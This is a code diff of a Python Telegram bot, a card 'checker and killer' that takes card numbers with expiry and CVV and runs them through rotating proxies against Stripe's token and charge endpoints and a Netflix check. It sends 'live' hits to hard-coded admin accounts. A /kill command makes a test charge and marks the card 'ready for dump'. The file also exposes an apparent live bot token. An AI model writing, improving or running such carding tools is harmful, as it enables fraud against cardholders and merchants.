@@ -5,12 +5,13 @@ import time
 import random
 from luhn import is_valid
 from bs4 import BeautifulSoup
+import re
 
-BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # Edit in GitHub
-ADMIN_IDS = [7869544426, 6383511175]  # e.g. [123456789, 987654321]
+BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # EDIT: Your BotFather token
+ADMIN_IDS = [7869544426, 6383511175]  # EDIT: e.g. [123456789, 987654321]
 bot = telebot.TeleBot(BOT_TOKEN)
 
-stats = {'live': 0, 'dead': 0, 'total': 0}
+stats = {'live':0, 'dead':0, 'total':0}
 cooldown = {}
 proxies = []
 lock = threading.Lock()
@@ -44,20 +45,18 @@ def fetch_proxies():
         livep = []
         def testp(p):
             try:
-                requests.get('http://httpbin.org/ip', proxies=p, timeout=4)
+                requests.get('httpbin.org/ip', proxies=p, timeout=4)
                 return p
-            except:
-                return None
+            except: return None
         thrs = []
-        for p in allp[:200]:
+        for p in allp[:150]:
             t = threading.Thread(target=lambda pp=p: livep.append(testp(pp)))
             t.start()
             thrs.append(t)
-        for t in thrs:
-            t.join(2)
+        for t in thrs: t.join(2)
         proxies[:] = [p for p in livep if p]
         last_fetch = time.time()
-        print(f'🔄 FPS Loaded {len(proxies)} live proxies')
+        print(f'🔄 {len(proxies)} live proxies loaded')
 
 def rand_proxy():
     fetch_proxies()
@@ -80,7 +79,7 @@ def check_gates(cc, m, y, cv, ret=3):
         p = rand_proxy()
         if not p: continue
         try:
-            data = {'card[number]': cc, 'card[exp_month': m, 'card[exp_year]': y, 'card[cvv]': cv}
+            data = {'card[number]': cc, 'card[exp_month]': m, 'card[exp_year]': y, 'card[cvv]': cv}
             r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=p, timeout=8)
             if 'token' in r.text:
                 gs.append('✅ Stripe LIVE')
@@ -107,7 +106,7 @@ def check_gates(cc, m, y, cv, ret=3):
             if 'error' not in r.text.lower():
                 gs.append('✅ Netflix PASS')
         except: pass
-    return gs or ['⚠️ Proxy retry']
+    return gs or ['⚠️ Retry gates']
 
 def kill_cc(cc, m, y, cv):
     p = rand_proxy()
@@ -115,15 +114,16 @@ def kill_cc(cc, m, y, cv):
         try:
             data = {'amount': '1', 'currency': 'usd'}
             requests.post('https://api.stripe.com/v1/charges', data=data, proxies=p, timeout=8)
-            return '🔪 KILLED - Ready for dump/shop API'
+            return '🔪 Stripe KILLED - Ready for dump!'
         except: pass
-    return '🔪 Sim kill complete - Manual profit'
+    return '🔪 Sim kill complete - Manual dump advised'
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.reply_to(m, '''🔥 FPS CC Checker 99% Auto Proxy
-`cc|mm|yy|cvv`
-/stats /kill (admin only)''', parse_mode='Markdown')
+    bot.reply_to(m, '''🔥 **CC Checker & Killer 99%**
+`cc|mm|yy|cvv` → Auto proxies + gates
+/stats /kill (admins only)
+/stats shows hit rate''', parse_mode='Markdown')
 
 @bot.message_handler(func=lambda m: '|' in m.text)
 def chk(m):
@@ -135,7 +135,7 @@ def chk(m):
     try:
         parts = [x.strip().replace(' ', '') for x in m.text.split('|')]
         if len(parts) != 4:
-            raise ValueError
+            raise ValueError('Bad format')
         cc, mon, yr, cvv = parts
         if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
             bot.reply_to(m, '❌ Invalid CC/Luhn')
@@ -145,7 +145,7 @@ def chk(m):
         bi = bin_info(cc[:6])
         gs = check_gates(cc, mon, yr, cvv)
         livec = sum(1 for g in gs if '✅' in g)
-        stat = '🟢 LIVE 99%' if livec >= 1 else '🔴 DEAD'
+        stat = '🟢 LIVE (99% good)' if livec >= 1 else '🔴 DEAD'
         resp = f'**CC:** `{cc}|{mon}|{yr}|{cvv}`\n**BIN:**\n{bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
         global stats
         stats['total'] += 1
@@ -155,7 +155,7 @@ def chk(m):
             resp += f'\n{kres}'
             for aid in ADMIN_IDS:
                 try:
-                    bot.send_message(aid, f'🟢 LIVE HIT @{m.from_user.username}: {m.text}\n{resp}')
+                    bot.send_message(aid, f'🟢 LIVE HIT from @{m.from_user.username or uid}: {m.text}\n{resp}')
                 except: pass
         else:
             stats['dead'] += 1
@@ -168,7 +168,7 @@ def st(m):
     if m.from_user.id not in ADMIN_IDS:
         return
     rate = (stats['live'] / max(stats['total'], 1)) * 100
-    bot.reply_to(m, f'📊 Live: {stats["live"]} | Dead: {stats["dead"]} | Total: {stats["total"]} | Hit: {rate:.1f}%')
+    bot.reply_to(m, f'📊 **Stats:**\nLive: {stats["live"]}\nDead: {stats["dead"]}\nTotal: {stats["total"]}\nHit Rate: {rate:.1f}%')
 
 @bot.message_handler(commands=['kill'])
 def kl(m):
@@ -178,9 +178,9 @@ def kl(m):
         data = m.text.split(' ', 1)[1].split('|')
         cc, mon, yr, cvv = [x.strip() for x in data]
         res = kill_cc(cc, mon, yr, cvv)
-        bot.reply_to(m, f'🔪 {res}')
+        bot.reply_to(m, f'🔪 **Kill:** {res}')
     except:
-        bot.reply_to(m, '/kill cc|mm|yy|cvv')
+        bot.reply_to(m, '❌ /kill cc|mm|yy|cvv')
 
 def refresher():
     while True:
@@ -188,7 +188,7 @@ def refresher():
         fetch_proxies()
 
 if __name__ == '__main__':
-    print('🚀 FPS.MS CC Bot LIVE 24/7')
+    print('🚀 PythonAnywhere CC Bot STARTED')
     fetch_proxies()
     threading.Thread(target=refresher, daemon=True).start()
     bot.polling(none_stop=True)
